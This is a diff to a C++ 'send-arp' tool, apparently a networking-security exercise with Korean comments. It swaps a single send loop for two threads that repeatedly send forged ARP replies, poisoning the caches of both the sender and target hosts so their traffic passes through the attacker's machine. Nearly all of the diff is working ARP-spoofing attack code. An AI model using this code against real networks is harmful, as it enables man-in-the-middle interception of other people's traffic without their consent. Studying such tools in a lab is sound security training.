@@ -5,10 +5,11 @@
 #include <sys/ioctl.h>
 #include <unistd.h>
 #include <arpa/inet.h>
-#include <ifaddrs.h> // 네트워크 인터페이스 정보를 가져오기 위한 헤더 파일
+#include <ifaddrs.h> 
+#include <pthread.h>
+#include <ctime>
 #include "ethhdr.h"
 #include "arphdr.h"
-#include <ctime>
 
 #pragma pack(push, 1)
 struct EthArpPacket final {
@@ -16,6 +17,15 @@ struct EthArpPacket final {
     ArpHdr arp_;
 };
 #pragma pack(pop)
+
+struct ArpThreadArgs {
+    pcap_t *handle;
+    const char *src_ip;
+    const char *dst_ip;
+    const unsigned char *src_mac;
+    const unsigned char *dst_mac;
+    int interval;
+};
 
 void usage() {
     printf("syntax: send-arp <interface> <sender ip> <target ip>\n");
@@ -184,6 +194,19 @@ int get_mac_about_ip(pcap_t *handle, const char *iface, const char *ip, unsigned
 
 }
 
+void* arp_reply_thread(void* args) {
+    ArpThreadArgs* arp_args = (ArpThreadArgs*)args;
+    while (true) {
+        send_arp_reply(arp_args->handle, arp_args->src_ip, arp_args->dst_ip, arp_args->src_mac, arp_args->dst_mac);
+        printf("Sent ARP Reply: %s is at %02x:%02x:%02x:%02x:%02x:%02x\n", 
+               arp_args->dst_ip, 
+               arp_args->src_mac[0], arp_args->src_mac[1], arp_args->src_mac[2], 
+               arp_args->src_mac[3], arp_args->src_mac[4], arp_args->src_mac[5]);
+        sleep(1);
+    }
+    return nullptr;
+}
+
 int main(int argc, char* argv[]) {
     if (argc != 4) {
         usage();
@@ -207,31 +230,17 @@ int main(int argc, char* argv[]) {
     get_mac_about_ip(handle, iface, argv[3], target_mac); // Target MAC 얻기
     get_wlan_mac(attacker_mac);                           // Attacker MAC 얻기
 
-    time_t last_arp_update_time = 0;
-    char attacker_mac_str[18];
-    snprintf(attacker_mac_str, sizeof(attacker_mac_str), "%02x:%02x:%02x:%02x:%02x:%02x",
-         attacker_mac[0], attacker_mac[1], attacker_mac[2],
-         attacker_mac[3], attacker_mac[4], attacker_mac[5]);
-    
-    int num = 0;
+    pthread_t thread1, thread2;
+    ArpThreadArgs args1 = {handle, argv[3], argv[2], attacker_mac, sender_mac, 10};
+    ArpThreadArgs args2 = {handle, argv[2], argv[3], attacker_mac, target_mac, 0};
 
-    while (true) {
+    pthread_create(&thread1, nullptr, arp_reply_thread, &args1);
+    pthread_create(&thread2, nullptr, arp_reply_thread, &args2);
 
-
-        if( num >= 1000 ){
-        send_arp_reply(handle, argv[3], argv[2], attacker_mac, sender_mac);
-        sleep(1);
-	num = 0;
-        }
-        send_arp_reply(handle, argv[2], argv[3], attacker_mac, target_mac); // Target에게 Sender의 MAC 주소를 Attacker로 설정
-
-        num++;
-        printf("Sent ARP Reply: %s is at %s\n", argv[3], attacker_mac_str); // Target IP -> Attacker MAC
-        printf("Sent ARP Reply: %s is at %s\n", argv[2], attacker_mac_str); // Sender IP -> Attacker MAC
-        
-    }
+    pthread_join(thread1, nullptr);
+    pthread_join(thread2, nullptr);
 
     pcap_close(handle);
     return 0;
 }
-    
+
